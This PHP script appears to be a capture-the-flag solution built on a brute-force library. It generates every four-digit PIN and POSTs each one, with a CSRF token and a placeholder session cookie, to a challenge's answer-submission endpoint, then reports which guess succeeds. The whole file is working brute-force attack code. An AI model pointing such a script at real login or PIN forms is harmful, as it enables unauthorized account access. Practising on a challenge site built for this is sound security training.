<?php

use JeanSouzaK\Brutal\Attack\HttpFormat;
use JeanSouzaK\Brutal\Attack\HttpOptions;
use JeanSouzaK\Brutal\BrutalService;
use JeanSouzaK\Brutal\CLI\Output;
use JeanSouzaK\Brutal\Combination\SimpleCombination;
use JeanSouzaK\Brutal\Repository\AttackRepositoryFactory;
use JeanSouzaK\Brutal\Repository\CLIReportRepositoryFactory;
use JeanSouzaK\Brutal\Repository\CombinationRepository;
use JeanSouzaK\Brutal\Repository\CombinationRepositoryFactory;
use JeanSouzaK\Brutal\Repository\HttpAttackRepositoryFactory;
use JeanSouzaK\Brutal\Repository\LoadRepositoryFactory;

require __DIR__ . '/vendor/autoload.php';
ini_set('memory_limit', '-1');

Output::display()->animation('brutal')->speed('2000')->scroll('left');


$from = '/tmp/brutal';
$brutalService = new BrutalService();
$MODE_SINGLE = 0;
$MODE_CHUNK = 1;

$combinations = $brutalService->generate(new SimpleCombination(), ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9'], 4);
$combinationRepository = CombinationRepositoryFactory::createRepository($combinations, $from, CombinationRepository::FORMAT_TEXT);
$brutalService->save($combinationRepository, $MODE_CHUNK);
$loadRepository = LoadRepositoryFactory::createRepository($from);
$chunks = $brutalService->load($loadRepository);
$httpOptions = new HttpOptions(
    'https://hack.ainfosec.com/challenge/submit-answer/',
    'POST',
    HttpFormat::FORM_PARAMS,
    [
        'csrfmiddlewaretoken' => '12b6lhriUbDz057K9L8LFPqDf3z5teCrPyQ2wHdqKbjk4vqsPD8WbnM3w1l4s16e',
        'challenge_id' => 'brutal_force',
        'answer' => '$term'
    ],
    [
        'cookie' => 'GET_YOUR_REQUEST_COOKIE_FROM_YOUR_BROWSER',
        'origin' => 'https://hack.ainfosec.com',
        'referer' => 'https://hack.ainfosec.com/',
        'user-agent' => 'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36',
        'authority' => 'hack.ainfosec.com',
        'method' => 'POST',
        'path' => '/challenge/submit-answer/',
        'accept' => 'application/json, text/javascript, */*; q=0.01',
        'x-requested-with' => 'XMLHttpRequest',
        'content-type' => 'application/x-www-form-urlencoded; charset=UTF-8',
        'sec-fetch-site' => 'same-origin',
        'sec-fetch-mode' => 'cors',
        'accept-encoding' => 'gzip, deflate, br',
        'accept-language' => 'en-US,en;q=0.9',

    ]
);
$httpAttackRepository = HttpAttackRepositoryFactory::createRepository($httpOptions);
$attackResult = $brutalService->attack($httpAttackRepository, $chunks);
$reportRepository = CLIReportRepositoryFactory::createRepository($httpOptions);
$brutalService->report($reportRepository, $attackResult);